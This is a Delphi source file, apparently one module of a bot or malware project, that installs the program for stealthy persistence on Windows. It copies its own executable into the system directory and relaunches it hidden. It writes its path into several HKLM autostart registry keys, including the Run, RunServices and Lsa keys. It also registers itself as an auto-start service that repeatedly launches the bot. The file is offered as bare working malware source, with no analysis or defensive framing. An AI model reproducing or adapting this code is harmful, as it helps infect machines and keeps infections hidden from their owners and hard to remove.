unit AutoStart;

interface

{$include def.mor}

implementation


uses
  Main,WinSvc,classes,shellapi,Windows,TlHelp32,config,sysutils{$ifdef debug},logger{$endif},stuff;

Function InstallReg:Boolean;
const
  keys_reg : array[1..4] of pchar = ('Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                                  'Software\\Microsoft\\Windows\\CurrentVersion\\RunServices',
                                  'Software\\Microsoft\\OLE',
                                  'SYSTEM\\CurrentControlSet\\Control\\Lsa');
var i:integer;
    lpszPath: PChar;
    Skey:Hkey;
begin
  Result:=False;
  GetMem(lpszPath,MAX_PATH+1);
  if GetModuleFileName(hInstance,lpszPath,MAX_PATH+1) <> 0 Then
  for i:=1 to 4 do
    begin
      If Result Then Break;
      if RegOpenKeyEx(HKEY_LOCAL_MACHINE, keys_reg[i], 0, KEY_SET_VALUE, SKey) = ERROR_SUCCESS Then
        if RegSetValueEx(Skey, Pchar(Config.Data.Bot_Service_Name), 0, REG_SZ, Pchar(lpszPath) ,Length(lpszPath)+1) = ERROR_SUCCESS Then // Dec Is Done!
          Result:=True;
      RegCloseKey(Skey);
    end;
  Freemem(lpszPath);
end;

var
  Status: TServiceStatus;
  StatusHandle: SERVICE_STATUS_HANDLE;
  ServiceTable: array [0..1] of TServiceTableEntry;
  Stopped: boolean;
  Paused: boolean;

procedure ServiceMain;
begin
  repeat
    if not Paused then
    begin
      LaunchBot;
      Sleep(1000);
    end;
  until Stopped;
end;

procedure ServiceCtrlHandler(Control: dword); stdcall;
begin
  case Control of
    SERVICE_CONTROL_STOP:
      begin
        Stopped := True;
        Status.dwCurrentState := SERVICE_STOP_PENDING;
        SetServiceStatus(StatusHandle, Status);
      end;
    SERVICE_CONTROL_PAUSE:
      begin
        Paused := True;
        Status.dwcurrentstate := SERVICE_PAUSED;
        SetServiceStatus(StatusHandle, Status);
      end;
    SERVICE_CONTROL_CONTINUE:
      begin
        Paused := False;
        Status.dwCurrentState := SERVICE_RUNNING;
        SetServiceStatus(StatusHandle, Status);
      end;
    SERVICE_CONTROL_INTERROGATE: SetServiceStatus(StatusHandle, Status);
    SERVICE_CONTROL_SHUTDOWN: Stopped := True;
  end;
end;

procedure ServiceCtrlDispatcher(dwArgc: dword; var lpszArgv: pchar); stdcall;
begin
  StatusHandle := RegisterServiceCtrlHandler(Pchar(Data.Bot_Service_Name), @ServiceCtrlHandler);
  if StatusHandle <> 0 then
  begin
    ZeroMemory(@Status, SizeOf(Status));
    Status.dwServiceType := SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS;
    Status.dwCurrentState:= SERVICE_START_PENDING;
    Status.dwControlsAccepted := SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_PAUSE_CONTINUE;
    Status.dwWaitHint := 1000;
    SetServiceStatus(StatusHandle, Status);
    Stopped := False;
    Paused := False;
    Status.dwCurrentState := SERVICE_RUNNING;
    SetServiceStatus(StatusHandle, Status);
    ServiceMain;
    Status.dwCurrentState := SERVICE_STOPPED;
    SetServiceStatus(StatusHandle, Status);
  end;
end;

Function InstallService:smallint;
var
  SCManager: SC_HANDLE;
  Service: SC_HANDLE;
begin
  result:=0;
  SCManager := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if SCManager = 0 then Exit;
  try
    Service := CreateService(SCManager, Pchar(Config.data.Bot_Service_Name), pchar(Config.data.BOT_Service_Info), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, pchar(ParamStr(0)), nil, nil, nil, nil, nil);
    if service <> 0 then result:=1
    else
      if GetLastError = ERROR_SERVICE_EXISTS then result:=3;
  finally
    CloseServiceHandle(Service);
    CloseServiceHandle(SCManager);
  end;
end;

begin
{$ifndef debug}
if (pos(getsysdir,ParamStr(0)) <= 0) then
begin
  if Copyfile(Pchar(ParamStr(0)),pchar(getsysdir + '\' + ExtractFileName(ParamStr(0))),false) then
  begin
    ShellExecute(0, nil, pchar(getsysdir + '\' + ExtractFileName(ParamStr(0))), nil, nil, SW_HIDE);
    halt;
  end
end
Else
begin
  InitConfig;
  If Data.BOT_As_Service then
  begin
    if installservice = 1 then if Data.BOT_As_reg then installreg;
  end
  else
    if Data.BOT_As_reg then installreg;
  ServiceTable[0].lpServiceName := Pchar(Data.BOT_Service_Name);
  ServiceTable[0].lpServiceProc := @ServiceCtrlDispatcher;
  ServiceTable[1].lpServiceName := nil;
  ServiceTable[1].lpServiceProc := nil;
  StartServiceCtrlDispatcher(ServiceTable[0]);
  LaunchBot;
end;
{$else}
InitConfig;
LaunchBot;
{$endif}

end.
